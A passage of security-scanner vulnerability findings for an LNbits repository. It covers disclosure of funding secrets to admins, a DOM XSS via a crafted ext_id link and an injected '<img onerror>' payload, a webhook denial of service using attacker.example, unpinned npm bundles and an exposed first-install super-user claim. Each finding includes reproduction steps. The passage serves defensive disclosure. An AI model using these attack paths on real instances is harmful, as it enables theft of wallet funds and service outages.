12. [lnbits/templates/components/admin/funding.vue:84–89](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components/admin/funding.vue#L84-L89)
   The UI hides the funding-sources panel behind v-if="isSuperUser", showing the intended boundary that the API does not enforce; admin.js:296-310 still loads the full response into every admin's browser.
13. [docs/guide/user\_roles.md:34–36](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/guide/user_roles.md#L34-L36)
   Documented role table: 'Change funding source' is Super User only, Admin is not permitted; super_user.md states 'the SU is the one trusted with funding source control'.

## Impact
All secrets held in LNbits settings except auth_secret_key/TOTP key/onchain master key are disclosed to a role the project excludes from them (C:H). With the Stripe/PayPal/Square/Revolut webhook signing secrets the admin can forge settlement webhooks and credit wallets with unbacked sats, and with the SSO client secrets and webpush private key impersonate the instance to its providers and users (I:H). Availability of LNbits itself is not directly affected. Subsequent-system impact: The disclosed LND admin macaroon / CLN pay rune / node mnemonic / custodial API key gives the admin direct control of the operator's funding node or custodial account outside LNbits: read all node data, pay arbitrary invoices draining the pot, close channels or otherwise disrupt the node.

## Reproduction steps
1. Attacker is an authenticated non-super admin (member of lnbits_admin_users with a password set — the documented 'manager' role). They send GET /admin/api/v1/settings with their session cookie or bearer token and receive the JSON body containing every funding-source credential, fiat/SSO secret and notification credential; the admin page does this automatically on load. No further steps, no race; admin UI enabled is the default (lnbits_admin_ui=True) and the admin router is mounted unconditionally.

## Recommended fix
The settings read endpoints (GET /admin/api/v1/settings and /settings/default) serialise the whole EditableSettings model for any admin; the authorization decision is made per-route (check_admin) with no per-field notion of super-user-only or write-only secret fields, so funding-source credentials and provider secrets cross the admin/super-user boundary. Fix criteria: A non-super admin calling GET /admin/api/v1/settings or /admin/api/v1/settings/default must not receive funding-source credentials, seeds/mnemonics, fiat provider secrets or webhook signing secrets, SSO client secrets, SMTP/Telegram/Nostr credentials or the webpush private key; secret-bearing fields should be omitted or masked on read for every caller (as lnbits_onchain_master_key already is) and accepted only on write. Verify by diffing a non-super admin's response against the field lists of FundingSourcesSettings, FiatProvidersSettings, NotificationsSettings and the *_client_secret fields.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257376

---

# Extension builder preview page composes innerHTML/script URLs from unvalidated query params (DOM XSS)

## Details
The extension-builder preview page (`window.PageExtensionBuilderPreview`) takes `ext_id`, `page` and `component` straight from the query string and builds two same-origin URLs from them which it then feeds to the two most dangerous helpers in `LNbits.utils`: `loadTemplate` (fetch -> `div.innerHTML` -> appended to `document.body`) and `loadScript` (`<script src>`). The intended value is a slug such as `my_ext`, but nothing enforces that. Because `url_for` normalises the string with `new URL()`, an `ext_id` of `..%2F..%2F..%2Ft%2F<id>%23` yields the request URL `https://<lnbits>/t/<id>?v=...` (the fixed `/template?page_name=` suffix becomes a fragment and is dropped). Any same-origin GET endpoint can therefore be chosen as the source of the HTML that is written with innerHTML and of the JavaScript that is loaded with a script tag.

Two gadgets exist in core:
1. `/t/{id}` (tinyurl) redirects to a URL chosen by any registered user (POST /api/v1/tinyurl needs only a wallet admin key). `fetch` follows the 307 to the attacker's host, which answers with `Access-Control-Allow-Origin: *` and `<img src=x onerror="...">`; `response.ok` is true, the body is written with innerHTML on the LNbits origin and the handler runs in the victim's session. The subsequent `loadScript` call loads the attacker's JavaScript through the same redirect (classic scripts need no CORS).
2. Without any external server: a public image asset (`/api/v1/assets/{id}/data`) whose PNG tEXt chunk carries the HTML payload; the upload check only verifies magic bytes and Pillow decodability, and innerHTML happily parses the text-decoded bytes.

The tinyurl redirect itself was previously judged intended behaviour (`tinyurl-open-redirect-arbitrary-destination`); this finding is a different defect at a different sink: the client-side preview page trusts URL-derived path segments when selecting what to inject into the DOM and execute. The shortener is merely one of two ways to make that sink deliver attacker content.

Attacker: any registered user (registration is open by default) or anyone with a wallet admin key. Victim: any user allowed to open the builder, i.e. every admin by default (all users if `lnbits_extensions_builder_activate_non_admins` is on). Delivery: a link to `https://<lnbits>/extensions/builder/preview?ext_id=..%2F..%2F..%2Ft%2F<id>%23&page=x&component=x`. Result: script execution on the LNbits origin in an admin session: `window.g.user` exposes the admin's wallet keys, and cookie-authenticated calls to `/admin/api/v1/settings` read funding/provider secrets and rewrite settings (admin users, funding source, SSO), i.e. user -> admin boundary breach.

Assumptions: Pillow (`pillow` as pinned in pyproject) accepts PNG tEXt chunks in `Image.verify()`, and `filetype` identifies by magic bytes only; browsers follow cross-origin redirects for `<script src>` without CORS and for `fetch` when the final response carries ACAO `*`.

## Evidence
1. [lnbits/static/js/pages/extensions\_builder\_preview.js:32–38](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/extensions_builder_preview.js#L32-L38)
   created() copies ext_id, page and component verbatim from window.location.search into this.extId / this.pageName / this.componentName and immediately calls reload(). No character or format validation is applied to any of them.
2. [lnbits/static/js/pages/extensions\_builder\_preview.js:15–29](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/extensions_builder_preview.js#L15-L29)
   reload() interpolates the raw extId into two same-origin URLs, `/extensions/builder/preview/${extId}/template?...` and `/extensions/builder/preview/${extId}/component?...`, and hands them to LNbits.utils.loadTemplate (fetch -> innerHTML) and LNbits.utils.loadScript (<script src>). An extId such as `../../../t/<id>#` escapes the intended /extensions/builder/preview/ prefix: the `..` segments are collapsed by URL parsing and the `#` turns the fixed `/template?page_name=` suffix into a fragment that is never sent.
3. [lnbits/static/js/utils.js:1–32](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/utils.js#L1-L32)
   url_for() resolves the composed string with `new URL(url, window.location.origin)` (dot-segment normalisation, fragment kept) and only appends ?v=. loadTemplate() fetches it with default redirect:'follow', and on any 2xx assigns response.text() to a div's innerHTML and appends the div to document.body; loadScript() creates a <script src=...> on document.body. Neither checks that the final URL stays under the preview path or even on this origin after redirects.
4. [lnbits/core/views/tinyurl\_api.py:93–106](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/tinyurl_api.py#L93-L106)
   Redirect gadget #1: GET /t/{id} is unauthenticated and 307-redirects to the stored URL. The URL is stored unvalidated by POST /api/v1/tinyurl (lines 27-45), which needs only a wallet admin key, i.e. any registered user. fetch() follows the redirect cross-origin (attacker serves Access-Control-Allow-Origin: *), and a classic <script src> follows it with no CORS requirement at all.
5. [lnbits/core/views/asset\_api.py:66–84](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/asset_api.py#L66-L84)
   Same-origin gadget #2 (no external server): public assets are served to anyone. services/assets.py:49-102 only checks magic bytes and that Pillow can verify the image, so a valid PNG whose tEXt chunk contains `<img src=x onerror=...>` is accepted; fetched via loadTemplate the bytes are decoded as text and parsed by innerHTML, and the img error handler runs.
6. [lnbits/core/views/generic.py:199–216](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/generic.py#L199-L216)
   GET /extensions/builder/preview renders base.html (which boots the SPA) for any logged-in user that passes check_extension_builder; query parameters are ignored server-side, so an attacker-crafted ?ext_id= link is served unchanged.
7. [lnbits/decorators.py:624–631](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L624-L631)
   check_extension_builder admits every admin user by default, and every user when lnbits_extensions_builder_activate_non_admins is set. Admins are therefore valid victims in a default deployment.
8. [lnbits/static/js/init-app.js:165–168](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/init-app.js#L165-L168)
   The Vue router maps /extensions/builder/preview to PageExtensionBuilderPreview, so the vulnerable created() hook runs as soon as the page loads; DynamicComponent (line 18) explicitly skips this path, so nothing else intercepts it.

## Impact
Script runs in an admin (or super-user) session on the LNbits origin: window.g.user holds the victim's wallet admin/invoice keys (funds), and same-origin cookie-authenticated requests reach the admin API, which returns funding-source and fiat-provider secrets and accepts settings changes (admin list, funding source, SSO). Confidentiality and integrity of the instance are fully compromised; availability is not directly affected.

## Reproduction steps
1. Attacker (any registered user) stores an external URL via POST /api/v1/tinyurl with their wallet admin key, or uploads a public PNG carrying HTML. They send an admin the link /extensions/builder/preview?ext_id=..%2F..%2F..%2Ft%2F<id>%23&page=x&component=x. The server renders the SPA (check_extension_builder passes for admins), the preview component builds the traversed URL, fetch follows the redirect / reads the public asset, innerHTML writes the payload and loadScript loads attacker JS, all on the LNbits origin with the admin's cookie session. Default configuration, no race, no defence to defeat.

## Recommended fix
1. extensions_builder_preview.js uses the raw ext_id / page / component query values as path segments and global-name lookups when composing URLs for loadTemplate and loadScript, so a crafted link redirects those DOM-injection and script-loading sinks to attacker-selected content. Fix criteria: The preview page must accept only identifiers matching a strict pattern (e.g. ^[a-z0-9_]+$) for ext_id, page and component, encode each segment, and verify that the resolved URL's pathname begins with /extensions/builder/preview/ before fetching or loading. A link with a traversing or fragment-bearing ext_id must result in no fetch, no innerHTML write and no script insertion.
2. LNbits.utils.loadTemplate and loadScript inject whatever a same-origin URL returns (including after redirects) into the document, with no origin or path allow-list, making them generic XSS sinks for any caller that lets input influence the URL. Fix criteria: loadTemplate/loadScript (and url_for) must refuse URLs that resolve off-origin, must not follow redirects (fetch redirect:'error' or a post-redirect origin/path check), and should restrict templates/scripts to allow-listed path prefixes (extension static mounts, builder preview). Verification: a loadTemplate call whose target 307s off-origin or points at /api/v1/assets must reject without touching the DOM.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257573

---

# Payment webhook POST buffers unbounded response body from user-chosen server

## Details
`_post_webhook` (lnbits/core/services/notifications.py:470-503) is the sender for the per-payment `webhook` URL that any wallet key holder may attach to an invoice (`POST /api/v1/payments`, invoice key) or to an outgoing payment (admin key). The destination is well guarded (check_callback_url, DNS resolve, non-global rejection, IP pinning, no redirects), but the response is not: the request is made with a plain `await client.post(request_url, ..., timeout=40)` and then `response.raise_for_status()`. With httpx (0.27.x per the manifest) a non-streaming request reads and buffers the entire response body in memory before returning, and nothing in LNbits bounds that body; the only value consumed is `response.status_code`. The `timeout=40` is a per-operation (connect/read/write/pool) timeout, so a server that keeps sending bytes never trips it.

Attack: a registered user (registration is open by default) creates two wallets, creates an invoice on wallet B with `webhook` pointing at a server they run on any public host (the default `lnbits_callback_url_rules` regex and the global-IP check both pass), and pays it from wallet A. The payment settles internally (`_pay_internal_invoice`, services/payments.py:862-868) and both the sender notification and the receiver's `internal_invoice_queue` listener reach `send_payment_notification` -> `dispatch_webhook` -> `_post_webhook`. The attacker's server answers `HTTP/1.1 200 OK` with chunked (or a huge Content-Length) body and streams indefinitely; the LNbits process accumulates the body in `response.content` without limit until the host runs out of memory or the container is OOM-killed, taking down the wallet service for every user. The attacker can repeat with many invoices to parallelise. There is no cost: the sats move between the attacker's own wallets.

This is a deterministic unbounded-allocation triggered by input that crosses the user -> server boundary, not volumetric load. The project already recognises response size as a control for user-chosen destinations: `_read_limited_lnurl_response` (lnurl.py:519-526) caps LNURL bodies at 256 KiB and the WASM `http.request` client caps at the same value, both using `client.stream` + `aiter_bytes`. `_post_webhook` is the one user-destination sender in the codebase without such a cap. (The web-push sender has the same property via pywebpush/requests, but that call site is already recorded under webpush-blocking-send-no-timeout-stalls-event-loop and webpush-subscription-endpoint-unvalidated-blind-ssrf.)

Dependency assumption: httpx 0.27.x `AsyncClient.post` without `stream=True` fully reads the body (`Response.aread`) and imposes no maximum content length; `timeout=40` maps to `httpx.Timeout(40)` whose read timeout is the maximum gap between received chunks, not a total deadline.

## Evidence
1. [lnbits/core/services/notifications.py:490–502](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L490-L502)
   _post_webhook builds a plain httpx.AsyncClient (no limits) and issues a non-streaming client.post(..., timeout=40) to the user-chosen webhook URL, then calls raise_for_status() and returns only status_code. httpx 0.27.2 (pyproject: httpx~=0.27.2) reads the whole body into Response.content before post() returns and imposes no maximum body size; timeout=40 is a per-operation Timeout whose read component bounds the gap between chunks, not the total transfer. A server that answers 200 and streams indefinitely (chunked or huge Content-Length) grows the process's memory without bound. This is the fix location.
2. [lnbits/core/services/notifications.py:255–279](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L255-L279)
   dispatch_webhook applies check_callback_url (destination policy only) and awaits _post_webhook; nothing on the path bounds or discards the response.
3. [lnbits/core/services/notifications.py:302–306](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L302-L306)
   send_payment_notification dispatches the webhook for any payment carrying a webhook that has not yet been sent; it runs as a background task (send_payment_notification_in_background) or from the core invoice listener registered in app.py:583 (dispatch_payment_notification), so the growing buffer lives in the single shared server process.
4. [lnbits/core/views/payment\_api.py:280–329](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L329)
   POST /api/v1/payments accepts the `webhook` field with an invoice key (incoming invoice via create_payment_request) or admin key (outgoing payment); the docstring states LNbits POSTs the payment to that URL once it succeeds. The attacker only needs keys to their own wallet.
5. [lnbits/core/services/payments.py:232–233](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L232-L233)
   create_wallet_invoice validates only the destination of data.webhook (check_callback_url: http(s) scheme, no userinfo, origin regex whose default allows any public domain) and stores it on the invoice; the response the destination will return is never constrained.
6. [lnbits/core/services/payments.py:862–869](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L862-L869)
   Paying an invoice of one own wallet from another own wallet settles internally and notifies both sides (sender via _send_payment_notification_in_background, receiver via internal_invoice_queue -> task_manager._internal_invoice_listener_consumer -> dispatch_payment_notification), so the attacker triggers the webhook POST at zero net cost and without any third party.
7. [lnbits/core/services/lnurl.py:519–525](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/lnurl.py#L519-L525)
   Contrast: the sibling LNURL client streams the response and aborts above LNURL_MAX_RESPONSE_BYTES (256 KiB); the WASM http client (wasm_ext/client/http.py:173-189) does the same. The project treats remote response size as a boundary for user-chosen destinations, but the webhook sender omits it.

## Impact
The buffered body grows without bound in the single LNbits process until memory is exhausted and the process is killed or the host swaps to a halt, denying the wallet service to all users; repeatable at will and at no cost. No data is disclosed and no state is altered.

## Reproduction steps
1. Any registered account (open registration by default) with two wallets: create an invoice on one with `webhook` = https://attacker.example/x (passes default callback rules and the global-IP check), pay it from the other. LNbits POSTs to the attacker's server in a background task; the server replies 200 and streams an endless body. No special configuration, no race, no victim action; the only requirement is a wallet key the attacker already holds.

## Recommended fix
_post_webhook reads the webhook server's full response into memory even though only the status code is needed, with no byte cap and no overall deadline, so a user-chosen server controls how much memory the LNbits process allocates. Fix criteria: The webhook sender must never buffer more than a small fixed number of response bytes (e.g. stream and discard, or abort above a cap like the 256 KiB used for LNURL) and must enforce a total request deadline rather than a per-read timeout. Verify by pointing a webhook at a server that streams an unbounded 200 body: LNbits memory stays flat and the webhook is marked sent/failed within the deadline.

---
**Severity:** HIGH
**Status:** Open
**Category:** Uncontrolled resource consumption
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257561

---

# Shipped browser bundle built from unpinned npm ranges with no lockfile and auto-committed by CI bot

## Details
The JavaScript LNbits serves to every browser (`lnbits/static/bundle.min.js`, `bundle-components.min.js`, `bundle.min.css`, selected in `lnbits/helpers.py:82-92`) is produced by `npm install && npm run bundle` (Makefile:147-150), which copies libraries out of `node_modules` into `lnbits/static/vendor/` and concatenates them with the core front-end. The threat model assumes `static/vendor/**` are 'upstream copies matching pinned versions'; the code shows they are not pinned:

- `.gitignore:10` ignores `*-lock.json`, so no `package-lock.json` exists in the repository (`git ls-files` confirms), and `.dockerignore:23` excludes it as well. Nothing in the tree records a version or integrity hash for the vendored packages.
- `package.json:25-40` declares the vendored runtime libraries with caret ranges (only vue, quasar, vue-router, vuex are exact): `axios`, `dompurify`, `nostr-tools`, `showdown`, `underscore`, `moment`, `chart.js`, `vue-i18n`, `vue-qrcode-reader`, `qrcode.vue` float within their major version. The committed `lnbits/static/vendor/axios.js` header already reads 'Axios v1.19.0' against a declared `^1.18.0`, demonstrating that the tracked copies are whatever the registry returned at bundle time.
- `bundle.yml:19-30` (called by `ci.yml:103-105` on every pull request) runs `make bundle` for same-repo PRs and, if the output differs, commits `lnbits/static` as 'alan <alan@lnbits.com>' with `[skip ci]` and pushes it to the PR branch using a `contents: write` token. A new upstream release of any of those packages is thus pulled into the repository by a bot the next time a maintainer opens or updates a branch PR, as a minified diff nobody wrote, and `[skip ci]` keeps other checks from re-running on it. The committed bundle then ships unchanged via `Dockerfile:36` (`COPY . .`) and the hatchling wheel (`pyproject.toml` packages = lnbits).
- The desktop release gates (`appimage.yml:51-57`, `windows.yml:35-43`) 'verify frontend assets' with `npm ci` + rebuild + diff; `npm ci` needs a tracked lockfile (npm documented behaviour), so as written the gate pins nothing and can only compare two fresh resolutions.

Consequence: a malicious or compromised in-range release of e.g. `dompurify` (used to sanitise user-supplied HTML in the UI), `axios` (carries every API call including wallet admin keys and the session token) or `nostr-tools` becomes part of the code LNbits serves on its single shared origin, with access to the session cookie, wallet admin/invoice keys embedded in pages, the admin settings UI (funding credentials) and the on-chain seed-entry components. Additionally, the same package's `npm install` lifecycle scripts execute inside the `contents: write` bundle job. The `.npmrc` `min-release-age=7` setting only delays adoption by a week; it provides no pin, hash or review. The threat model lists 'compromised dependency reaching credentialed workflows' as the CI/release adversary; this is the path by which such a dependency reaches both a write-token workflow and shipped code with no human in the loop.

Root cause: the artefact the project ships is derived from third-party code downloaded without any integrity check or version pin, and the pipeline automates committing the derived artefact.

## Evidence
1. [.gitignore:10](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.gitignore#L10)
   `*-lock.json` is ignored, so no package-lock.json or npm-shrinkwrap.json is tracked (git ls-files lists only flake.lock, poetry.lock, uv.lock). Every `npm install` therefore resolves package.json ranges afresh from the registry with no recorded integrity hashes; this is the line the fix must change.
2. [package.json:25–39](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/package.json#L25-L39)
   Runtime browser libraries that are vendored into the served bundle use caret ranges: axios ^1.18.0, dompurify ^3.4.16, nostr-tools ^2.23.3, showdown ^2.1.0, underscore ^1.13.8, moment ^2.30.1, chart.js ^4.5.1, vue-i18n ^11.4.2, vue-qrcode-reader ^5.7.3, qrcode.vue ^3.9.0. Only vue, quasar, vue-router and vuex are exact. Any newer in-range release is accepted.
3. [Makefile:147–150](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/Makefile#L147-L150)
   `make bundle` is `npm install` (not `npm ci`) followed by `npm run bundle`: the shipped vendor files are regenerated from whatever the registry returns at that moment.
4. [.github/workflows/bundle.yml:19–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/bundle.yml#L19-L30)
   On every same-repo pull request (ci.yml:103-105, after all tests pass) this job runs `make bundle`, then commits `lnbits/static` as user 'alan' with `[skip ci]` and pushes to the PR branch using a `contents: write` token. Freshly resolved third-party code enters the repository automatically, with no human authoring or reviewing the minified diff and no checks re-running on it. The same `npm install` also runs every dependency's lifecycle scripts inside this write-token job.
5. [package.json:5–13](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/package.json#L5-L13)
   `npm run bundle` copies the `vendor` list out of node_modules into lnbits/static/vendor/ and concatenates/minifies them with the core JS into bundle.min.js, bundle-components.min.js and bundle.min.css.
6. [lnbits/static/vendor/axios.js:1](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/vendor/axios.js#L1)
   The committed vendor copy is 'Axios v1.19.0' while package.json declares ^1.18.0: the tracked file is already whatever the registry resolved at bundle time, not a pinned version. This contradicts the threat model's assumption that static/vendor/** are 'upstream copies matching pinned versions'.
7. [lnbits/helpers.py:82–92](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/helpers.py#L82-L92)
   Every rendered page includes bundle.min.js / bundle-components.min.js / bundle.min.css when bundle_assets is on, or the individual vendor/*.js files from vendor.json otherwise; either way the vendored npm code runs on the single LNbits origin for every user, admin and super user.
8. [.npmrc:1](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.npmrc#L1)
   `min-release-age=7` is the only shipped mitigation: it delays adoption of a new upstream release by seven days (assuming the npm bundled with Node 24.x honours this option). It does not pin, hash or verify anything; a malicious release that survives a week on the registry is adopted.
9. [.github/workflows/appimage.yml:51–57](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/appimage.yml#L51-L57)
   The desktop release gate (also windows.yml:40-43) runs `npm ci && npm run bundle && git diff --exit-code -- lnbits/static`. `npm ci` requires a tracked package-lock.json (npm documented behaviour, stated as an assumption); with none in the tree the step cannot pin anything and the design only compares one fresh resolution against another rather than against reviewed versions.
10. [.github/actions/prepare/action.yml:41–46](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/actions/prepare/action.yml#L41-L46)
   The npm cache key is hashFiles('package-lock.json') and the install step is plain `npm install`; with no lockfile the key hashes nothing, confirming the pin the pipeline is designed around does not exist in the tree.

## Impact
Injected JavaScript runs on the LNbits origin for every user, admin and super user: it can read the session cookie/JWT, wallet admin and invoice keys embedded in pages, admin settings including funding credentials, and drive payments, settings changes or extension installs through the authenticated session, so confidentiality and integrity are HIGH. The install-script execution inside the contents:write bundle job also lets the same release push commits to the repository. Availability impact is limited to breaking the UI (LOW).

## Reproduction steps
1. Attacker position: ability to publish a release of one of the vendored npm packages within its declared semver range (maintainer-account compromise, malicious maintainer, or registry-side substitution). That upstream compromise is a precondition outside this system, hence AT:PRESENT; the LNbits side needs no privileges and no circumvention. Delivery is automatic: once the release is older than the 7-day min-release-age window, the next same-repo PR's bundle job resolves it, runs its install scripts under a contents:write token, rebuilds and pushes the new bundle into the branch, which is merged in the normal flow and shipped by Docker COPY and the wheel. Victims receive the code on their next LNbits page load (UI:PASSIVE: they only use the UI).

## Recommended fix
1. The vendored browser libraries are downloaded from floating semver ranges with no lockfile or integrity data, so the content of the shipped bundle is not fixed by anything in the repository. Fix criteria: The exact versions and integrity hashes of every vendored package are committed (a tracked lockfile or equivalent pin plus integrity data), all bundle builds install from that lock only (`npm ci`-style, failing on drift or hash mismatch, with install scripts disabled where not needed), and a rebuild from a clean checkout reproduces the committed `lnbits/static/vendor/*` and `bundle*.min.*` byte-for-byte. Verify that publishing a new upstream version within range does not change the bundle until the lock is deliberately updated.
2. CI commits regenerated third-party code into the repository automatically with `[skip ci]` under a write token, removing human review from dependency changes to the served bundle. Fix criteria: Bundle regeneration either fails the check (requiring a developer to commit and review the change) or produces a reviewable, separately merged change; no job pushes third-party code into branches without a human-authored commit and a re-run of checks.

---
**Severity:** HIGH
**Status:** Open
**Category:** Unverified code download
**CWE:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257558

---

# Documented installers expose a fresh, token-less first-install super-user claim to the whole internet

## Details
LNbits' bootstrap design is that the first party to reach a fresh instance claims the super user: `PUT /api/v1/auth/first_install` (lnbits/core/views/auth_api.py:621-658) requires no credential when `FIRST_INSTALL_TOKEN` is unset, overwrites the super user's username/password with the caller's choice and returns a logged-in super-user session; until then the middleware (lnbits/middleware.py:235-245) redirects every request to `/first_install`, which fingerprints the unclaimed state. That design is only safe while the operator is the only party able to connect. The two shipped install paths in this unit break that precondition by default and nothing in the project's documentation tells the operator to restore it:

- `lnbits.sh` (the one-liner docs/guide/installation.md:216-223 tells users to `wget` and run) hard-codes `HOST=0.0.0.0` and `LNBITS_ADMIN_UI=true` and exports them (:8,10,65-67; exported env vars override the copied `.env`'s `HOST=127.0.0.1` under pydantic 1.10 BaseSettings precedence), copies `.env.example` to `.env` with `FIRST_INSTALL_TOKEN` commented out (:56; .env.example:9-11), runs `sudo ufw allow $PORT/tcp` (:70-72) and immediately execs the server (:75). It never generates, requires or prints a first-install token.
- `nix/modules/README.md` 'Quick Start (Recommended)' (:24-42) overrides the module's safe defaults (`lnbits-service.nix` host=127.0.0.1, openFirewall=false) with `host = "0.0.0.0"`, `openFirewall = true`, `LNBITS_ADMIN_UI = "true"`, and 'First Time Setup' (:149-169) has the operator run `nixos-rebuild switch` first and only afterwards open `http://your-server-ip:5000` to 'follow the first-time setup wizard'.

On a VPS or cloud host (the usual target: both paths run `sudo` and manage the host firewall) the instance is therefore internet-reachable and advertising itself as unclaimed during the window between service start and the operator's first browser visit. An unauthenticated peer who connects first sends one PUT with a username and password and becomes the super user. From there they control every admin setting including the funding source the operator is about to attach, can install Python extensions (arbitrary code as the service user, which under lnbits.sh is the sudo-capable installing account), and read every secret LNbits later holds. The operator sees a login page instead of the wizard; if they assume setup already ran or re-run, the compromise can persist while they connect their node.

The only shipped mention of `FIRST_INSTALL_TOKEN` is the commented optional example in `.env.example`; docs/guide/installation.md and docs/guide/admin_ui.md ('First run and Super User ID') never instruct setting it or keeping the port closed until the super user exists, so this is an insecure default of the installers, not an unapplied documented fencing requirement. The endpoint's token-less design itself is not the defect reported here; the defect is that production install units expose that bootstrap to anonymous network peers with no per-install secret. Explicit dependency assumption: pydantic ~=1.10.26 `BaseSettings` gives OS environment variables priority over `env_file` values (documented pydantic v1 behaviour).

## Evidence
1. [lnbits.sh:8–10](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits.sh#L8-L10)
   The one-shot installer (docs/guide/installation.md:216-223 tells users to wget and run it) defaults HOST=0.0.0.0 and LNBITS_ADMIN_UI=true and exports them (:65-67); under pydantic 1.10 BaseSettings exported environment variables take priority over the .env file, so .env.example's HOST=127.0.0.1 (:48) is overridden and the click --host default (server.py:20, settings.host) becomes 0.0.0.0. Admin UI on is what creates the env-provider super user and enables the first-install bootstrap.
2. [lnbits.sh:69–75](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits.sh#L69-L75)
   It then runs `sudo ufw allow $PORT/tcp` and execs LNbits bound to all interfaces: the instance is reachable from every network the host sits on from its first second, before any operator action.
